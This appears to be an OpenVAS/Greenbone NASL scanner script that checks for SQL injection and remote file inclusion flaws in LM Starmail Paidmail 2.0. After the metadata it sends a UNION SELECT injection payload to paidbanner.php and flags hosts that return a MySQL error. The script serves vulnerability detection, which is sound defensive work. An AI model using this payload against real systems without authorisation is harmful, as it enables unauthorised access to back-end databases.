if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902099" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-08-30 16:09:21 +0200 (Mon, 30 Aug 2010)" );
	script_cve_id( "CVE-2009-4993", "CVE-2009-4992" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "LM Starmail Paidmail SQL Injection and Remote File Inclusion Vulnerabilities" );
	script_xref( name: "URL", value: "http://inj3ct0r.com/exploits/5624" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaw caused by improper validation of user-supplied input via the 'ID'
  parameter to 'paidbanner.php' and 'page' parameter to 'home.php'." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running LM Starmail Paidmail and is prone SQL Injection
  and Remote File Inclusion Vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database." );
	script_tag( name: "affected", value: "LM Starmail Paidmail version 2.0" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/lm_starmail_paidmail", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, "<title> LM Starmail" )){
		req = http_get( item: NASLString( dir, "/paidbanner.php?ID=-1+union+select+1,2,3" + ",4,5,user(),7,8,9,10--" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "mysql_fetch_array(): supplied argument is not a valid MySQL result resource" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

